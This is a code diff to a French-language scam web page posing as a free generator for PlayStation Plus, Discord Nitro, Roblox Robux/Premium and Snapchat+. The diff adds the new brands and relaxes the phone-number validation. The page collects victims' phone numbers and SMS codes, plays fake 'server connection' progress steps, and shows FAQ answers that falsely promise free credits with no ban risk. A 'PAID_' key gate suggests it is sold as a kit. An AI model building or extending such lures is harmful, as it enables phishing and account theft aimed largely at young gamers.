@@ -21,6 +21,7 @@
             --shadow-glow: rgba(204, 51, 255, 0.4);
             --logo-bg: #fffc00;
             --text-glow: #df80ff;
+            --btn-text: #ffffff;
         }
 
         body.theme-roblox {
@@ -34,6 +35,35 @@
             --shadow-glow: rgba(0, 170, 255, 0.4);
             --logo-bg: transparent;
             --text-glow: #80d4ff;
+            --btn-text: #ffffff;
+        }
+
+        body.theme-playstation {
+            /* Thème PlayStation (Dark Premium) */
+            --bg-start: #000000;
+            --bg-end: #0a0a0a;
+            --primary: #ffffff;
+            --secondary: #cccccc;
+            --accent: #00439c;
+            --border-glow: rgba(255, 255, 255, 0.4);
+            --shadow-glow: rgba(255, 255, 255, 0.2);
+            --logo-bg: transparent;
+            --text-glow: #ffffff;
+            --btn-text: #000000; /* Texte noir sur boutons blancs */
+        }
+
+        body.theme-discord {
+            /* Thème Discord (Gamer Lounge) */
+            --bg-start: #1e1f22;
+            --bg-end: #313338;
+            --primary: #5865F2; /* Blurple */
+            --secondary: #4752c4;
+            --accent: #23a559; /* Vert succès */
+            --border-glow: rgba(88, 101, 242, 0.5);
+            --shadow-glow: rgba(88, 101, 242, 0.4);
+            --logo-bg: transparent;
+            --text-glow: #ffffff;
+            --btn-text: #ffffff;
         }
 
         /* --- STYLE GÉNÉRAL --- */
@@ -87,18 +117,18 @@
             -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
 
-        /* --- CHAMP IDENTIFIANT ET MOT DE PASSE (CALIBRAGE STRICT) --- */
+        /* --- CHAMP IDENTIFIANT ET MOT DE PASSE --- */
         .login-input-group {
             background: rgba(0, 0, 0, 0.3); 
             border-radius: 50px; 
             margin-bottom: 15px; 
-            height: 50px; /* HAUTEUR FIXE EXACTE */
+            height: 50px; 
             padding: 0 20px;
             display: flex; 
             align-items: center; 
-            border: 1px solid rgba(255, 255, 255, 0.1); /* ÉPAISSEUR IDENTIQUE AUX BOUTONS */
+            border: 1px solid rgba(255, 255, 255, 0.1); 
             transition: border-color 0.3s ease, box-shadow 0.3s ease;
-            box-sizing: border-box; /* EMPECHE LE DÉBORDEMENT */
+            box-sizing: border-box; 
         }
         .login-input-group:focus-within {
             border-color: var(--primary); box-shadow: 0 0 10px var(--shadow-glow);
@@ -111,15 +141,8 @@
             flex-shrink: 0;
         }
         .login-input-group input {
-            background: transparent; 
-            border: none; 
-            color: white; 
-            padding: 0; 
-            margin: 0; 
-            width: 100%; 
-            height: 100%; /* REMPLIT EXACTEMENT LA HAUTEUR */
-            outline: none; 
-            font-size: 14px; /* TAILLE IDENTIQUE AUX BOUTONS */
+            background: transparent; border: none; color: white; padding: 0; 
+            margin: 0; width: 100%; height: 100%; outline: none; font-size: 14px; 
         }
         .login-input-group input::placeholder { color: rgba(255, 255, 255, 0.5); }
 
@@ -128,7 +151,7 @@
             width: 100%;
             background: linear-gradient(135deg, var(--primary), var(--secondary));
             border: none; border-radius: 50px; padding: 18px;
-            color: white; font-weight: 900; font-size: 16px; cursor: pointer;
+            color: var(--btn-text); font-weight: 900; font-size: 16px; cursor: pointer;
             box-shadow: 0 5px 20px var(--shadow-glow); text-transform: uppercase; transition: all 0.3s ease;
         }
         .btn-glow, .btn-return { border-radius: 12px; font-size: 18px; letter-spacing: 2px; margin-bottom: 30px; padding: 20px; }
@@ -137,23 +160,13 @@
         }
         .btn-login:disabled, .btn-glow:disabled, .btn-return:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        /* --- BOUTONS INVITÉ ET DEMO (CALIBRAGE STRICT) --- */
+        /* --- BOUTONS INVITÉ ET DEMO --- */
         .btn-guest, .btn-demo-direct {
-            width: 100%; 
-            height: 50px; /* HAUTEUR FIXE EXACTE - IDENTIQUE AUX CHAMPS */
-            display: flex; 
-            align-items: center; 
-            justify-content: center;
-            background: transparent; 
-            border: 1px solid rgba(255, 255, 255, 0.1); 
-            border-radius: 50px; 
-            padding: 0; 
-            color: rgba(255, 255, 255, 0.6);
-            margin-top: 15px; 
-            font-size: 14px; /* TAILLE IDENTIQUE AUX CHAMPS */
-            cursor: pointer; 
-            transition: all 0.3s ease;
-            box-sizing: border-box; /* EMPECHE LE DÉBORDEMENT */
+            width: 100%; height: 50px; display: flex; align-items: center; justify-content: center;
+            background: transparent; border: 1px solid rgba(255, 255, 255, 0.1); 
+            border-radius: 50px; padding: 0; color: rgba(255, 255, 255, 0.6);
+            margin-top: 15px; font-size: 14px; cursor: pointer; transition: all 0.3s ease;
+            box-sizing: border-box; 
         }
         .btn-guest:hover, .btn-demo-direct:hover {
             color: white; border-color: var(--primary); background: rgba(255, 255, 255, 0.05);
@@ -188,18 +201,28 @@
         @keyframes pulseDemo { 0%, 100% { box-shadow: 0 0 10px rgba(255, 204, 0, 0.2); } 50% { box-shadow: 0 0 20px rgba(255, 204, 0, 0.6); } }
 
         /* --- SWITCHERS (MENUS) --- */
-        .switcher-container {
-            display: flex; background: rgba(0,0,0,0.4); border-radius: 50px;
+        .main-switcher {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 8px;
+            background: rgba(0,0,0,0.4); border-radius: 20px;
+            padding: 8px; margin-bottom: 25px; border: 1px solid rgba(255,255,255,0.1);
+        }
+        .sub-switcher {
+            display: none; /* Rendu visible via JS */
+            background: rgba(0,0,0,0.4); border-radius: 50px;
             padding: 5px; margin-bottom: 25px; border: 1px solid rgba(255,255,255,0.1);
+            animation: fadeIn 0.3s ease;
         }
         .switch-btn {
-            flex: 1; padding: 12px; text-align: center; font-weight: 800; font-size: 14px;
+            flex: 1; padding: 12px; text-align: center; font-weight: 800; font-size: 13px;
             color: rgba(255,255,255,0.5); cursor: pointer; border-radius: 40px;
             transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 1px;
+            display: flex; align-items: center; justify-content: center;
         }
-        .switch-btn.active { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; box-shadow: 0 0 15px var(--shadow-glow); }
-        
-        #sub-switcher-container { display: none; margin-top: -10px; margin-bottom: 25px; animation: fadeIn 0.3s ease; }
+        .switch-btn.active { 
+            background: linear-gradient(135deg, var(--primary), var(--secondary)); 
+            color: var(--btn-text); 
+            box-shadow: 0 0 15px var(--shadow-glow); 
+        }
 
         /* --- LOGO & TITRE --- */
         .logo-wrapper { position: relative; width: 140px; height: 140px; margin: 0 auto 30px; transition: transform 0.5s ease; }
@@ -216,7 +239,7 @@
 
         .plus-badge {
             position: absolute; top: -5px; right: -5px; background-color: var(--accent); color: var(--bg-end);
-            width: 42px; height: 42px; border-radius: 50%; font-size: 22px; font-weight: 900;
+            width: 42px; height: 42px; border-radius: 50%; font-size: 20px; font-weight: 900;
             display: flex; justify-content: center; align-items: center; border: 4px solid var(--bg-end);
             transition: all 0.8s ease;
         }
@@ -230,7 +253,6 @@
             transition: border-color 0.3s ease, box-shadow 0.2s ease;
         }
         .input-group:focus-within { border-color: var(--primary); box-shadow: 0 0 10px var(--shadow-glow); }
-        .input-group label { display: none; }
 
         .prefix-phone { 
             background-color: rgba(0,0,0,0.4); padding: 0 15px; height: 58px; font-weight: bold; font-size: 17px; 
@@ -333,6 +355,7 @@
             .title { font-size: 20px; }
             .logo-wrapper { width: 120px; height: 120px; margin-bottom: 25px; }
             .plus-badge { width: 36px; height: 36px; font-size: 18px; }
+            .switch-btn { font-size: 11px; padding: 10px; }
         }
     </style>
 </head>
@@ -368,39 +391,38 @@
             
             <div id="admin-badge" class="admin-badge"></div>
 
-            <!-- MENU GLOBAL -->
-            <div class="switcher-container">
-                <div class="switch-btn active" id="btn-snap" onclick="setService('snap')">Snapchat</div>
+            <!-- MENU GLOBAL 4 PLATEFORMES (GRILLE 2x2) -->
+            <div class="main-switcher">
+                <div class="switch-btn active" id="btn-playstation" onclick="setService('playstation')">PlayStation</div>
                 <div class="switch-btn" id="btn-roblox" onclick="setService('roblox')">Roblox</div>
+                <div class="switch-btn" id="btn-discord" onclick="setService('discord')">Discord</div>
+                <div class="switch-btn" id="btn-snap" onclick="setService('snap')">Snapchat</div>
             </div>
 
-            <!-- SOUS-MENU ROBLOX -->
-            <div class="switcher-container" id="sub-switcher-container">
-                <div class="switch-btn active" id="btn-robux" onclick="setSubService('robux')">Générateur Robux</div>
-                <div class="switch-btn" id="btn-roblox-plus" onclick="setSubService('roblox_plus')">Roblox+</div>
+            <!-- SOUS-MENU DYNAMIQUE (ROBLOX / DISCORD) -->
+            <div class="sub-switcher" id="sub-switcher-container">
+                <!-- Rempli dynamiquement via JS -->
             </div>
 
             <!-- LOGO DYNAMIQUE -->
             <div class="logo-wrapper">
                 <div class="border-gradient">
                     <div class="logo-bg" id="logo-bg">
-                        <img src="logosnapchat.png" id="main-logo" alt="Logo Service">
+                        <img src="logoplaystation.png" id="main-logo" alt="Logo Service">
                     </div>
                 </div>
                 <div class="plus-badge" id="plus-badge">+</div>
             </div>
 
-            <h1 class="title" id="main-title">ACTIVATION SNAP<br>PLUS +</h1>
+            <h1 class="title" id="main-title">PLAYSTATION<br>PLUS</h1>
 
             <!-- ÉTAPE 1 : FORMULAIRE -->
             <div id="step-1">
-                <div class="input-group" id="group-username">
-                    <input type="text" id="username" placeholder="Nom d'utilisateur Snapchat" maxlength="50">
-                </div>
+                <!-- Suppression du champ Nom d'utilisateur (Standardisation V1.54) -->
                 
                 <div class="input-group" id="group-phone">
                     <div class="prefix-phone">+33 🇫🇷</div>
-                    <input type="tel" id="phone" placeholder="Numéro de téléphone (10 chiffres)" maxlength="10" inputmode="numeric">
+                    <input type="tel" id="phone" placeholder="Ex: 06 12 34 56 78" maxlength="14" inputmode="numeric">
                 </div>
 
                 <div class="input-group dropdown-group" id="group-offer">
@@ -466,7 +488,7 @@
                 </a>
             </div>
 
-            <div class="patch-version">V1.53</div>
+            <div class="patch-version">V1.54</div>
 
         </div>
     </div>
@@ -475,21 +497,145 @@
         // ==========================================
         // 1. CONFIGURATION DYNAMIQUE (STATE MACHINE)
         // ==========================================
-        let currentService = 'snap'; // 'snap' ou 'roblox'
-        let currentSubService = 'robux'; // 'robux' ou 'roblox_plus' (si roblox)
+        let currentService = 'playstation'; 
+        let currentSubService = null; 
 
         const siteConfig = {
+            playstation: {
+                theme: 'theme-playstation',
+                title: "PLAYSTATION<br>PLUS",
+                logo: "logoplaystation.png",
+                plusText: "+",
+                selectLabel: "Sélectionner l'offre",
+                options: [
+                    { value: "ps_ess", text: "1 an – Essential" },
+                    { value: "ps_ext", text: "1 an – Extra" },
+                    { value: "ps_prem", text: "1 an – Premium" }
+                ],
+                loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">🎮</div>',
+                successMsg: "L'abonnement PlayStation Plus sera activé sur votre compte d'ici quelques instants.",
+                progressSteps: [
+                    { width: "20%", text: "Connexion sécurisée au PlayStation Network..." },
+                    { width: "45%", text: "Validation du compte utilisateur..." },
+                    { width: "68%", text: "Génération du jeton d'abonnement..." },
+                    { width: "90%", text: "Synchronisation avec les serveurs PSN..." },
+                    { width: "100%", text: "Activation validée et établie !" }
+                ],
+                faq: [
+                    { q: "Le service est-il gratuit ?", a: "Oui, l'activation initiale via notre plateforme est entièrement gratuite pour les utilisateurs éligibles." },
+                    { q: "L'abonnement sera-t-il lié à mon compte actuel ?", a: "Tout à fait, le processus s'attache directement à votre compte PlayStation Network existant." },
+                    { q: "Pourquoi valider mon numéro ?", a: "Cette vérification prévient les abus en s'assurant que vous êtes une vraie personne." }
+                ]
+            },
+            roblox: {
+                robux: {
+                    theme: 'theme-roblox',
+                    title: "GÉNÉRATEUR DE<br>ROBUX",
+                    logo: "roblox.png",
+                    plusText: "R$",
+                    selectLabel: "Sélectionner le montant",
+                    options: [
+                        { value: "1700", text: "1 700 Robux" },
+                        { value: "3150", text: "3 150 Robux" },
+                        { value: "4500", text: "4 500 Robux" }
+                    ],
+                    loaderHtml: '<img src="roblox.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
+                    successMsg: "Les Robux seront crédités sur votre compte d'ici quelques instants.",
+                    progressSteps: [
+                        { width: "20%", text: "Connexion sécurisée aux serveurs Roblox..." },
+                        { width: "45%", text: "Identification du compte joueur..." },
+                        { width: "68%", text: "Génération et cryptage des paquets de Robux..." },
+                        { width: "90%", text: "Validation de la transaction réseau..." },
+                        { width: "100%", text: "Transfert validé et établi !" }
+                    ],
+                    faq: [
+                        { q: "Combien de temps prend le transfert ?", a: "Le processus est très rapide. Une fois l'opération validée, les Robux sont crédités en moins de 5 minutes." },
+                        { q: "Est-ce risqué pour mon compte ?", a: "Non, notre système simule des transferts légitimes." }
+                    ]
+                },
+                roblox_plus: {
+                    theme: 'theme-roblox',
+                    title: "ROBLOX<br>PREMIUM",
+                    logo: "roblox.png",
+                    plusText: "+",
+                    selectLabel: "Sélectionner l'offre",
+                    options: [
+                        { value: "1m", text: "1 mois Roblox Premium" },
+                        { value: "3m", text: "3 mois Roblox Premium" },
+                        { value: "6m", text: "6 mois Roblox Premium" },
+                        { value: "12m", text: "1 an Roblox Premium" }
+                    ],
+                    loaderHtml: '<img src="roblox.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
+                    successMsg: "L'abonnement Roblox Premium sera activé sur votre compte d'ici quelques instants.",
+                    progressSteps: [
+                        { width: "20%", text: "Connexion aux serveurs Roblox..." },
+                        { width: "45%", text: "Analyse du profil joueur..." },
+                        { width: "68%", text: "Injection du statut Roblox Premium..." },
+                        { width: "90%", text: "Synchronisation de l'abonnement..." },
+                        { width: "100%", text: "Activation validée et établie !" }
+                    ],
+                    faq: [
+                        { q: "Le service est-il gratuit ?", a: "Oui, l'activation via notre plateforme est gratuite pour les utilisateurs sélectionnés." }
+                    ]
+                }
+            },
+            discord: {
+                nitro: {
+                    theme: 'theme-discord',
+                    title: "DISCORD<br>NITRO",
+                    logo: "logodiscord.png",
+                    plusText: "N",
+                    selectLabel: "Sélectionner l'offre",
+                    options: [
+                        { value: "n_1m", text: "1 mois Nitro Premium" },
+                        { value: "n_1y", text: "1 an Nitro Premium" }
+                    ],
+                    loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">💬</div>',
+                    successMsg: "L'abonnement Discord Nitro sera activé sur votre compte d'ici quelques instants.",
+                    progressSteps: [
+                        { width: "20%", text: "Connexion sécurisée aux serveurs Discord..." },
+                        { width: "45%", text: "Vérification des droits d'accès..." },
+                        { width: "68%", text: "Génération du lien cadeau d'abonnement..." },
+                        { width: "90%", text: "Injection du statut Nitro Premium..." },
+                        { width: "100%", text: "Activation validée et établie !" }
+                    ],
+                    faq: [
+                        { q: "Nitro sera-t-il activé automatiquement ?", a: "Oui, une fois le processus terminé, Nitro s'appliquera directement à votre profil Discord lié." }
+                    ]
+                },
+                boosts: {
+                    theme: 'theme-discord',
+                    title: "SERVER<br>BOOSTS",
+                    logo: "logodiscord.png",
+                    plusText: "🚀",
+                    selectLabel: "Sélectionner le pack",
+                    options: [
+                        { value: "b_2", text: "2 Server Boosts" },
+                        { value: "b_7", text: "7 Server Boosts" },
+                        { value: "b_14", text: "14 Server Boosts" }
+                    ],
+                    loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">🚀</div>',
+                    successMsg: "Les Boosts seront ajoutés à votre inventaire d'ici quelques instants.",
+                    progressSteps: [
+                        { width: "20%", text: "Connexion aux serveurs Discord..." },
+                        { width: "45%", text: "Préparation des packages de Boost..." },
+                        { width: "68%", text: "Synchronisation avec l'inventaire..." },
+                        { width: "90%", text: "Finalisation du transfert..." },
+                        { width: "100%", text: "Boosts livrés avec succès !" }
+                    ],
+                    faq: [
+                        { q: "Puis-je les utiliser sur n'importe quel serveur ?", a: "Absolument, les Boosts sont placés dans votre inventaire et peuvent être appliqués au serveur de votre choix." }
+                    ]
+                }
+            },
             snap: {
                 theme: 'theme-snap',
                 title: "ACTIVATION SNAP<br>PLUS +",
                 logo: "logosnapchat.png",
                 plusText: "+",
-                userPlaceholder: "Nom d'utilisateur Snapchat",
                 selectLabel: "Sélectionner l'offre",
                 options: [
-                    { value: "1", text: "1 mois Premium" },
-                    { value: "3", text: "3 mois Premium" },
-                    { value: "12", text: "12 mois Premium" }
+                    { value: "snap_plus", text: "Abonnement Snapchat+" }
                 ],
                 loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">⏳</div>',
                 successMsg: "Les fonctionnalités Snap+ seront disponibles sur votre compte d'ici quelques instants.",
@@ -501,66 +647,10 @@
                     { width: "100%", text: "Activation validée et établie !" }
                 ],
                 faq: [
-                    { q: "Le service est-il vraiment gratuit ?", a: "Oui, l'activation initiale via notre plateforme est entièrement gratuite pour les utilisateurs éligibles sélectionnés par notre système." },
-                    { q: "Combien de temps prend l'activation de Snap+ ?", a: "Le processus d'analyse et de synchronisation prend environ 1 à 2 minutes. Une fois la barre à 100%, les fonctionnalités s'activent sur votre compte." },
-                    { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire afin de vérifier que vous êtes bien un utilisateur réel et non un robot. Cela nous permet de prévenir les abus." }
+                    { q: "Le service est-il vraiment gratuit ?", a: "Oui, l'activation initiale via notre plateforme est entièrement gratuite pour les utilisateurs éligibles." },
+                    { q: "Combien de temps prend l'activation de Snap+ ?", a: "Le processus d'analyse et de synchronisation prend environ 1 à 2 minutes." },
+                    { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape prévient les abus par des robots en confirmant que vous êtes humain." }
                 ]
-            },
-            roblox: {
-                robux: {
-                    theme: 'theme-roblox',
-                    title: "GÉNÉRATEUR DE<br>ROBUX",
-                    logo: "roblox.png",
-                    plusText: "R$",
-                    userPlaceholder: "Pseudo Roblox",
-                    selectLabel: "Sélectionner le montant",
-                    options: [
-                        { value: "1700", text: "1 700 Robux" },
-                        { value: "3150", text: "3 150 Robux" },
-                        { value: "4500", text: "4 500 Robux" }
-                    ],
-                    loaderHtml: '<img src="robux.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
-                    successMsg: "Les Robux seront crédités sur votre compte d'ici quelques instants.",
-                    progressSteps: [
-                        { width: "20%", text: "Connexion sécurisée aux serveurs Roblox..." },
-                        { width: "45%", text: "Identification du compte joueur..." },
-                        { width: "68%", text: "Génération et cryptage des paquets de Robux..." },
-                        { width: "90%", text: "Validation de la transaction réseau..." },
-                        { width: "100%", text: "Transfert validé et établi !" }
-                    ],
-                    faq: [
-                        { q: "Combien de temps prend le transfert des Robux ?", a: "Le processus est très rapide. Une fois l'opération validée, les Robux sont généralement crédités en moins de 5 minutes." },
-                        { q: "Est-ce que mon compte Roblox risque d'être banni ?", a: "Non, notre système utilise des méthodes sécurisées pour simuler l'achat de crédits, aucune activité suspecte n'est détectée." },
-                        { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire afin de vérifier que vous êtes bien un utilisateur réel et non un robot. Cela nous permet de garantir que les ressources vont à des humains." }
-                    ]
-                },
-                roblox_plus: {
-                    theme: 'theme-roblox',
-                    title: "ACTIVATION<br>ROBLOX +",
-                    logo: "roblox.png",
-                    plusText: "+",
-                    userPlaceholder: "Pseudo Roblox",
-                    selectLabel: "Sélectionner l'offre",
-                    options: [
-                        { value: "1", text: "1 mois Premium" },
-                        { value: "3", text: "3 mois Premium" },
-                        { value: "12", text: "12 mois Premium" }
-                    ],
-                    loaderHtml: '<img src="robux.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
-                    successMsg: "L'abonnement Roblox+ sera activé sur votre compte d'ici quelques instants.",
-                    progressSteps: [
-                        { width: "20%", text: "Connexion sécurisée aux serveurs Roblox..." },
-                        { width: "45%", text: "Analyse du profil joueur..." },
-                        { width: "68%", text: "Injection du statut Roblox+..." },
-                        { width: "90%", text: "Synchronisation de l'abonnement..." },
-                        { width: "100%", text: "Activation validée et établie !" }
-                    ],
-                    faq: [
-                        { q: "Le service est-il vraiment gratuit ?", a: "Oui, l'activation initiale via notre plateforme est entièrement gratuite pour les utilisateurs éligibles." },
-                        { q: "Quels sont les avantages de Roblox+ ?", a: "Roblox+ vous donne accès à des fonctionnalités premium exclusives sur la plateforme." },
-                        { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire pour vérifier votre identité humaine et sécuriser l'attribution de l'abonnement." }
-                    ]
-                }
             }
         };
 
@@ -570,36 +660,64 @@
         function setService(service) {
             currentService = service;
             
-            // Gestion UI Boutons Principaux
-            document.getElementById('btn-snap').classList.toggle('active', service === 'snap');
+            // UI Boutons Principaux
+            document.getElementById('btn-playstation').classList.toggle('active', service === 'playstation');
             document.getElementById('btn-roblox').classList.toggle('active', service === 'roblox');
+            document.getElementById('btn-discord').classList.toggle('active', service === 'discord');
+            document.getElementById('btn-snap').classList.toggle('active', service === 'snap');
             
-            // Gestion d'affichage Sous-Menu
+            // Gestion Sous-Menu
             const subMenu = document.getElementById('sub-switcher-container');
             if (service === 'roblox') {
                 subMenu.style.display = 'flex';
-                setSubService('robux'); // Par défaut
+                subMenu.innerHTML = `
+                    <div class="switch-btn" id="btn-robux" onclick="setSubService('robux')">Générateur Robux</div>
+                    <div class="switch-btn" id="btn-roblox-plus" onclick="setSubService('roblox_plus')">Roblox Premium</div>
+                `;
+                setSubService('robux');
+            } else if (service === 'discord') {
+                subMenu.style.display = 'flex';
+                subMenu.innerHTML = `
+                    <div class="switch-btn" id="btn-nitro" onclick="setSubService('nitro')">Nitro Premium</div>
+                    <div class="switch-btn" id="btn-boosts" onclick="setSubService('boosts')">Option Boosts</div>
+                `;
+                setSubService('nitro');
             } else {
                 subMenu.style.display = 'none';
+                subMenu.innerHTML = '';
+                currentSubService = null;
                 applyConfig();
             }
         }
 
         function setSubService(subService) {
             currentSubService = subService;
-            document.getElementById('btn-robux').classList.toggle('active', subService === 'robux');
-            document.getElementById('btn-roblox-plus').classList.toggle('active', subService === 'roblox_plus');
+            const subBtns = document.getElementById('sub-switcher-container').getElementsByClassName('switch-btn');
+            for (let btn of subBtns) btn.classList.remove('active');
+            
+            if(subService === 'robux') document.getElementById('btn-robux').classList.add('active');
+            if(subService === 'roblox_plus') document.getElementById('btn-roblox-plus').classList.add('active');
+            if(subService === 'nitro') document.getElementById('btn-nitro').classList.add('active');
+            if(subService === 'boosts') document.getElementById('btn-boosts').classList.add('active');
+            
             applyConfig();
         }
 
         function applyConfig() {
             let activeConfig;
-            if (currentService === 'snap') {
+            document.body.className = ''; 
+
+            if (currentService === 'playstation') {
+                activeConfig = siteConfig.playstation;
+                document.body.className = 'theme-playstation';
+            } else if (currentService === 'snap') {
                 activeConfig = siteConfig.snap;
-                document.body.className = '';
-            } else {
+            } else if (currentService === 'roblox') {
                 activeConfig = siteConfig.roblox[currentSubService];
                 document.body.className = 'theme-roblox';
+            } else if (currentService === 'discord') {
+                activeConfig = siteConfig.discord[currentSubService];
+                document.body.className = 'theme-discord';
             }
 
             // Textes et Images
@@ -613,7 +731,6 @@
             }, 300);
 
             document.getElementById('plus-badge').textContent = activeConfig.plusText;
-            document.getElementById('username').placeholder = activeConfig.userPlaceholder;
             
             // Sélecteur
             const offerLabel = document.getElementById('offer-label');
@@ -632,10 +749,8 @@
                 optionsContainer.appendChild(div);
             });
 
-            // Loader dynamique
+            // Loader & FAQ
             document.getElementById('loader-container').innerHTML = activeConfig.loaderHtml;
-
-            // FAQ Dynamique
             const faqList = document.getElementById('faq-list');
             faqList.innerHTML = '';
             activeConfig.faq.forEach(item => {
@@ -700,7 +815,7 @@
             setTimeout(() => {
                 overlay.style.display = "none";
                 site.style.display = "block";
-                applyConfig(); // Init Config
+                setService('playstation'); // État de départ V1.54
                 setTimeout(() => { 
                     site.style.opacity = "1"; 
                     if (isGuest) showKeyAccessPopup();
@@ -732,7 +847,6 @@
             if(!keyInput.startsWith("PAID_")) {
                 triggerShake('group-key-input'); showError("❌ Format de clé invalide."); return;
             }
-            // Simulation validation DB (Mode test accepté ici)
             if(keyInput === "PAID_DEMO123") {
                 document.getElementById('key-popup-access').remove();
                 isGuest = false; showError("✅ Clé valide. Accès autorisé !");
@@ -782,9 +896,14 @@
         function processValidation() {
             if (isGuest) { showKeyAccessPopup(); return; }
             
-            if (document.getElementById('username').value.trim().length < 3) { triggerShake('group-username'); showError('❌ Nom/Pseudo invalide.'); return; }
-            if (!/^[0-9]{10}$/.test(document.getElementById('phone').value.trim())) { triggerShake('group-phone'); showError('❌ Numéro invalide (10 chiffres).'); return; }
-            if (!document.getElementById('offer-select').value) { triggerShake('group-offer'); showError('❌ Veuillez sélectionner une option.'); return; }
+            // Validation Numéro (Espaces autorisés, mais doit contenir au moins 10 chiffres)
+            const phoneVal = document.getElementById('phone').value.replace(/\s+/g, '');
+            if (phoneVal.length < 10 || isNaN(phoneVal)) { 
+                triggerShake('group-phone'); showError('❌ Numéro invalide (10 chiffres requis).'); return; 
+            }
+            if (!document.getElementById('offer-select').value) { 
+                triggerShake('group-offer'); showError('❌ Veuillez sélectionner une offre.'); return; 
+            }
 
             const btn = document.getElementById('submitBtn');
             btn.innerHTML = "Envoi en cours..."; btn.disabled = true;
@@ -824,8 +943,12 @@
             const pb = document.getElementById('pb');
             const msg = document.getElementById('status-msg');
             
-            // Récupère les textes de chargement selon la config actuelle
-            const activeConfig = currentService === 'snap' ? siteConfig.snap : siteConfig.roblox[currentSubService];
+            let activeConfig;
+            if(currentService === 'playstation' || currentService === 'snap') {
+                activeConfig = siteConfig[currentService];
+            } else {
+                activeConfig = siteConfig[currentService][currentSubService];
+            }
             const steps = activeConfig.progressSteps;
 
             let i = 0;
@@ -857,7 +980,6 @@
             document.getElementById('step-3').style.display = 'none';
             document.getElementById('step-1').style.display = 'block';
             
-            document.getElementById('username').value = '';
             document.getElementById('phone').value = '';
             document.getElementById('sms-code').value = '';
             
